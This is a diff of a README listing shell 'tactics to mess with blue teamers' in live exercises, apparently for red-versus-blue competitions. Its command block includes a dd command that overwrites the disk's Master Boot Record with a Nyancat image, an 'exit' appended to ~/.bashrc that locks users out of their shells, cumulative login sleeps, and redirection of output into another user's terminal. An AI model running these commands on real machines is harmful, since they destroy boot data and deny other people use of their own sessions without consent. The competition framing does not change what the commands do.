@@ -4,24 +4,17 @@ A small collection of tactics to mess with blue teamers in live environments...
 
 ```shell
 xrandr -o inverted # Flip X11 desktop session upside down.
+
 tty # Retrieve TTY number (for redirection)
 w   # Gives you you /dev/pts numbers
-
-git clone https://github.com/klange/nyancat.git
-cd nyancat
-make
-cd src
-./nyancat > /dev/pts/<pts-num-of-opponent>
 
 dd if=nyan.mbr of=/dev/sda # NyanMBR necessary, overwrites Master Boot Recrd with Nyancat animation. The MBR image can be found in this repository: https://github.com/brainsmoke/nyanmbr
 
 echo exit >> ~/.bashrc # Add a logout to the login script
 
-cat /dev/urandom > /dev/pts/[pts-num-of-opponent] # Fill terminal with random noise spewing out at high speed.
+<animation or random noise> > /dev/pts/[pts-num-of-opponent] # Redirect output to another user's terminal
 
 echo "echo \"sleep 1;\" >> ~/.bashrc">> ~/.bashrc # Add a longer sleep to their terminal startup every time they login. 
-
-telnet towel.blinkenlights.nl > /dev/[pts-num-of-opponent]
 
 export PROMPT_CMD="clear && echo 'You didn't say the magic word!'"
 ```
